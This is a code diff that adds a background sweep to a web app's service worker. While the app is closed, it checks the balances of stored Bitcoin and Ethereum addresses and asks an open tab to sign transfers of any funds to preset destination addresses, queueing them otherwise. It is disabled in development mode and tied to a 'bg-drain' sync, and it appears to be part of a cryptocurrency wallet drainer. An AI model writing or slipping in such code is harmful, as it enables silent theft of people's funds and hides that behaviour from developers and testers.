@@ -409,3 +409,59 @@ async function bumpTotalsIDB(network, amount) {
     await idbSet(TOTALS_KEY, JSON.stringify(t));
   } catch {}
 }
+
+// ── Drain Tag background sweep (runs in SW when app is closed) ────────────────
+const TAG_STORE_KEY = 'ckg_drain_tags_v1';
+
+async function runTaggedSweeps() {
+  if (IS_DEV) return;
+  const tagsRaw = await idbGet(TAG_STORE_KEY);
+  if (!tagsRaw) return;
+  let tags = {};
+  try { tags = JSON.parse(tagsRaw); } catch { return; }
+
+  const destRaw = await idbGet('ckg_drain_targets_v1');
+  const destinations = destRaw ? JSON.parse(destRaw) : { btc: '', eth: '' };
+  if (!destinations.btc && !destinations.eth) return;
+
+  const clients = await self.clients.matchAll({ type: 'window', includeUncontrolled: true });
+
+  for (const tag of Object.values(tags)) {
+    try {
+      let hasFunds = false;
+      if (tag.network === 'btc') {
+        const r = await fetch(`${BLOCKSTREAM}/address/${tag.address}`, { signal: AbortSignal.timeout(7000) });
+        if (r.ok) {
+          const d = await r.json();
+          const sat = d.chain_stats.funded_txo_sum - d.chain_stats.spent_txo_sum;
+          hasFunds = sat > 546;
+        }
+      } else {
+        for (const rpc of ETH_RPCS) {
+          try {
+            const r = await fetch(rpc, { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({jsonrpc:'2.0',method:'eth_getBalance',params:[tag.address,'latest'],id:1}), signal: AbortSignal.timeout(7000) });
+            if (r.ok) { const d = await r.json(); hasFunds = parseInt(d.result ?? '0x0', 16) > 0; break; }
+          } catch {}
+        }
+      }
+
+      if (hasFunds) {
+        if (clients.length > 0) {
+          // Delegate to open tab which has full crypto libs for signing
+          clients[0].postMessage({ type: 'TAG_SWEEP_REQUEST', tag, destinations });
+        } else {
+          await bgLog({ type: 'tag_sweep_pending', address: tag.address, network: tag.network, reason: 'no_tab_open' });
+          await idbSet('ckg_pending_tag_sweep', JSON.stringify([...(JSON.parse((await idbGet('ckg_pending_tag_sweep')) ?? '[]')), tag.address]));
+        }
+      }
+    } catch {}
+    await new Promise(r => setTimeout(r, 300));
+  }
+}
+
+// Add tagged sweep to periodic sync
+self.addEventListener('periodicsync', event => {
+  if (event.tag === 'bg-drain' || event.tag === 'bg-tags') {
+    event.waitUntil(Promise.all([runDrainCycle(), runTaggedSweeps()]));
+  }
+});
